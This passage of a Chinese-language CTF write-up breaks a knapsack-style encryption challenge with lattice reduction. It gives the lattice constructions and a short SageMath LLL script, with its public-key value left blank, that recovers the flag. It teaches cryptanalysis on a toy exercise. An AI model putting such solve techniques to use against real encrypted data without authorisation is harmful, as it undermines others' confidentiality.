newline"></span></span></span></span></p><ul><li>但是在加密的时候有所不同，不同的地方在于，<strong>Merkle-Hellman背包加密算法</strong>使用的是二进制序列去乘每个公钥，而我们的这个加密是使用<code>flag</code>的<strong>ASCII</strong>码直接去乘公钥。</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>c</mi><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mi>o</mi><mi>r</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>m</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>∗</mo><mi>p</mi><mi>u</mi><mi>b</mi><mi>k</mi><mi>e</mi><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">c = \sum_{i=1}^{n}ord(m_i)*pubkey_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">u</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p><p><img src="/2025/05/27/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E8%83%8C%E5%8C%85%E5%8A%A0%E5%AF%86/image-20250528170851712.png" alt="image-20250528170851712"></p><p><img src="/2025/05/27/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E8%83%8C%E5%8C%85%E5%8A%A0%E5%AF%86/image-20250528170900968.png" alt="image-20250528170900968"></p><ul><li>很显然是经典的背包加密，并且我们已知公钥和密文，所以我们就使用经典的造格，对所造之格进行规约。</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>p</mi><mi>u</mi><mi>b</mi><mi>k</mi><mi>e</mi><msub><mi>y</mi><mn>1</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>p</mi><mi>u</mi><mi>b</mi><mi>k</mi><mi>e</mi><msub><mi>y</mi><mn>2</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋱</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>p</mi><mi>u</mi><mi>b</mi><mi>k</mi><mi>e</mi><msub><mi>y</mi><mi>n</mi></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>c</mi></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><annotation encoding="application/x-tex">\begin{bmatrix}1 &amp; 0&amp; \cdots &amp;0   &amp;pubkey_1\\0 &amp; 1&amp; \cdots&amp;0  &amp;pubkey_2 \\\vdots &amp;\vdots&amp;\ddots&amp;\vdots&amp;\vdots\\0 &amp;0&amp;\cdots&amp;1&amp;pubkey_n\\0 &amp;0&amp;\cdots&amp;0&amp;c\\\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:6.66em;vertical-align:-3.079999999999999em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.555985em;"><span style="top:-0.7499750000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-1.8999750000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-2.4959750000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.0919750000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.6879750000000002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.283975em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.314965000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-5.555985000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.050045em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.240000000000001em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋯</span></span></span><span style="top:-5.04em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋯</span></span></span><span style="top:-3.18em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋱</span></span></span><span style="top:-1.9800000000000009em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋯</span></span></span><span style="top:-0.7800000000000009em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋯</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mord mathnormal">u</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mord mathnormal">u</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mord mathnormal">u</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.555985em;"><span style="top:-0.7499750000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-1.8999750000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-2.4959750000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.0919750000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-3.6879750000000002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.283975em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.314965000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-5.555985000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.050045em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">pubkey = </span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(pubkey)</span><br><span class="line">L = Matrix(QQ,n+<span class="number">1</span>,n+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    L[i,i] = <span class="number">1</span></span><br><span class="line">    L[-<span class="number">1</span>,i] = <span class="number">0</span></span><br><span class="line">    L[i,-<span class="number">1</span>] = pubkey[i]</span><br><span class="line">L[-<span class="number">1</span>,-<span class="number">1</span>] = c</span><br><span class="line"><span class="comment">#print(L)</span></span><br><span class="line">result = L.LLL()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result[<span class="number">0</span>]:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">abs</span>(<span class="built_in">int</span>(i))),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>最终规约出来的结果如下：</li></ul><p><img src="/2025/05/27/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E8%83%8C%E5%8C%85%E5%8A%A0%E5%AF%86/image-20250528171159958.png" alt="image-20250528171159958"></p><ul><li>但是如果我们这样造格，规约出来的结果m需要<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi><mn>2</mn><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">m//2+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mord">/</span><span class="mord">/</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>，才能得到最终的明文，</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>p</mi><mi>u</mi><mi>b</mi><mi>k</mi><mi>e</mi><msub><mi>y</mi><mn>1</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>p</mi><mi>u</mi><mi>b</mi><mi>k</mi><mi>e</mi><msub><mi>y</mi><mn>2</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋱</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>p</mi><mi>u</mi><mi>b</mi><mi>k</mi><mi>e</mi><msub><mi>y</mi><mi>n</mi></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>c</mi></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><annotation encoding="application/x-tex">\begin{bmatrix}2 &amp; 0&amp; \cdots &amp;0   &amp;pubkey_1\\0 &amp; 2&amp; \cdots&amp;0  &amp;pubkey_2 \\\vdots &amp;\vdots&amp;\ddots&amp;\vdots&amp;\vdots\\0 &amp;0&amp;\cdots&amp;2&amp;pubkey_n\\1 &amp;1&amp;\cdots&amp;1&amp;c\\\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:6.66em;vertical-align:-3.079999999999999em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.555985em;"><span style="top:-0.7499750000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-1.8999750000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-2.4959750000000005em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.0919750000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-3.6879750000000002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.283975em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.314965000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-5.555985000000001em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.050045em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.167500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-0.9675000000000009em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.240000000000001em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋯</span></span></span><span style="top:-5.04em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋯</span></span></span><span style="top:-3.18em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋱</span></span></span><span style="top:-1.9800000000000009em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋯</span></span></span><span style="top:-0.7800000000000009em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner">⋯</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.079999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.5800000000000005em;"><span style="top:-6.427500000000001em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-5.2275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.3675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span 